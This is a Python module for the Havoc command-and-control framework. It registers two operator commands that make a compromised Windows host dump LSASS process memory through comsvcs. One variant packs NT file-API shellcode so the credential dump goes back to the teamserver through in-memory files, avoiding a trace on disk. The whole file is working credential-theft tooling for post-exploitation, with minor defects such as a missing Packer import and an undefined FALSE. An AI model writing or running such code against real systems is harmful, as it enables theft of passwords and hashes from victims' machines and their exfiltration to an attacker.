from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists


def ComsvcsDump(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    dumpPath: str = None

    if len(args) != 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "wrong parameters!")
        return FALSE

    packer.addstr(args[0])
    demon = Demon(demon_id)
    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon dump lsass via comsvcs")
    demon.InlineExecute(task_id, "go", "./bin/ComsvcsDump.o", packer.getbuffer(), False)
    return task_id

def MemFilesComsvcsDump(demon_id, *args):
    
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    string: str = None
    int32: int = 0
    pic_bof_binary: bytes = b''

    pic_file_paths = [
			"./PIC/Bin/NtCreateFile.x64.bin",
			"./PIC/Bin/NtWriteFile.x64.bin",
			"./PIC/Bin/NtClose.x64.bin",
			"./PIC/Bin/NtQueryVolumeInformationFile.x64.bin",
			"./PIC/Bin/NtQueryInformationFile.x64.bin",
			"./PIC/Bin/NtSetInformationFile.x64.bin",
			"./PIC/Bin/NtReadFile.x64.bin",
			"./PIC/Bin/NtOpenFile.x64.bin",
			# "./PIC/Bin/NtFlushBuffersFile.x64.bin"
    ]

    for path in pic_file_paths:
        if exists( path ) is False:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"PIC binary file path not found: {path}")
            return False

    for path in pic_file_paths:
        pic_file_binary = open( path, 'rb' ).read()
        if len(pic_file_binary) == 0:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"PIC binary file is empty: {path}" )
            return False
        packer.addstr(pic_file_binary)

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon dump lsass via comsvcs and send dump to TS via memfiles")

    demon.InlineExecute(task_id, "go", "./bin/MemfilesComsvcsDump.o", packer.getbuffer(), False)
    return task_id

# Register the Python function as a command to the Havoc client
RegisterCommand(ComsvcsDump, "", "comsvcsdump", "Dump lsass via comsvcs", 0, "[target path]", "C:\\Windows\\Temp\\Dump.dmp")
RegisterCommand(MemFilesComsvcsDump, "", "comsvcsdump_memfiles", "Dump lsass via comsvcs and send dump to TS via MemFiles", 0, "", "")
